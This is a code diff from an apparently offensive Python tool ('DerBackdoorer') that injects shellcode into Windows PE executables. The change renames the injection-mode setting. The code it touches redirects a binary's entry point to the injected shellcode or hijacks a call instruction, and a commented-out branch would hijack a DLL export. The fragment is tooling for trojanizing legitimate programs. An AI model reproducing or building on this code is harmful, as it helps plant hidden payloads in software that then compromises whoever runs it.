@@ -19,9 +19,9 @@ logger = logging.getLogger("DerBackdoorer")
 
 
 class PeBackdoor:
-    def __init__(self, superpe: SuperPe, main_shc: bytes, inject_mode: InjectStyle):
+    def __init__(self, superpe: SuperPe, main_shc: bytes, carrier_invoke_style: CarrierInvokeStyle):
         self.superpe: SuperPe = superpe
-        self.runMode: InjectStyle = inject_mode
+        self.carrier_invoke_style: CarrierInvokeStyle = carrier_invoke_style
         self.shellcodeData: bytes = main_shc
 
         # Working
@@ -72,17 +72,17 @@ Trailing {sect_name} bytes:
 
 
     def setupShellcodeEntryPoint(self):
-        if self.runMode == InjectStyle.ChangeEntryPoint:
+        if self.carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
             rva = self.superpe.pe.get_rva_from_offset(self.shellcodeOffset)
             self.superpe.set_entrypoint(rva)
 
             logger.info(f'Address Of Entry Point changed to: RVA 0x{rva:X}')
             return True
 
-        elif self.runMode == InjectStyle.BackdoorCallInstr:
+        elif self.carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
             return self.backdoorEntryPoint()
 
-        #elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
+        #elif self.carrier_invoke_style == int(PeBackdoor.Supportedcarrier_invoke_styles.HijackExport):
         #    addr = self.getExportEntryPoint()
         #    if addr == -1:
         #        logger.critical('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')
